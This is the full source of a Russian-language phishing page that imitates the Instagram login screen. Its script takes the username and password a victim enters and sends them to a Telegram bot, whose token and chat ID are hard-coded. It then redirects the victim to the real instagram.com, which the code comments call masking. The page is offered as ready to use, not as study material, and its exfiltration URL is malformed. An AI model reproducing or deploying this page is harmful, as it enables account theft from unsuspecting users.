<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход • Instagram</title>
    <!-- Подключаем шрифт, похожий на лого Instagram -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        /* Дизайн максимально под Инстаграм */
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        
        /* Оригинальный стиль шрифта логотипа */
        .logo { 
            font-family: 'Grand Hotel', cursive; 
            font-size: 50px; 
            font-weight: 500; 
            margin-bottom: 30px; 
            letter-spacing: 1px;
        }
        
        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px; box-sizing: border-box; }
        input:focus { border-color: #555; }
        button { width: 100%; padding: 10px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; font-size: 14px; }
        .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">Instagram</div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Телефон, имя пользователя или email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
    </div>

    <div class="footer">Meta © 2024</div>

    <script>
        const form = document.getElementById('loginForm');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Твои проверенные данные
            const token = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
            const chat_id = '6576262467';
            
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            
            const text = `📸 NEW LOG:\n👤 Логин: ${u}\n🔑 Пароль: ${p}`;

            // Отправка данных
            try {
                await fetch(`https://telegram.org{token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (err) {
                console.log('Ошибка отправки');
            }

            // Маскировка: перенаправление
            window.location.href = 'https://instagram.com';
        });
    </script>

</body>
</html>
